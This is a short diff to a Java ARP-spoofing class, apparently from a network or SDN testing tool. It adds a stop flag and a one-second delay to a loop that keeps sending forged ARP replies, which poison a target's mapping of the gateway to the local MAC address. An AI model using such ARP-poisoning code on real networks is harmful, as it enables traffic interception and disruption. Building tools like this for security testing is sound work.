@@ -32,6 +32,8 @@ public class ARPSpoof implements Runnable {
     private String controllerIp;
     private String switchIp;
 
+    private boolean spoofing;
+
     public ARPSpoof(PcapNetworkInterface nif) {
         this.nif = nif;
     }
@@ -40,6 +42,10 @@ public class ARPSpoof implements Runnable {
         this.channelIp = channel;
         this.controllerIp = controller;
         this.switchIp = sw;
+    }
+
+    public void setARPspoof(boolean value) {
+        spoofing = value;
     }
 
     public void run() {
@@ -79,8 +85,16 @@ public class ARPSpoof implements Runnable {
 
             log.info("ARP Spoofing Started");
 
-            while (true) {
+            spoofing = true;
+
+            while (spoofing) {
                 handle.sendPacket(buildArpPacket(ArpOperation.REPLY, gatewayIP, targetIP, localMac, targetMac));
+
+                try {
+                    Thread.sleep(1000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
             }
         } catch (PcapNativeException e) {
             e.printStackTrace();
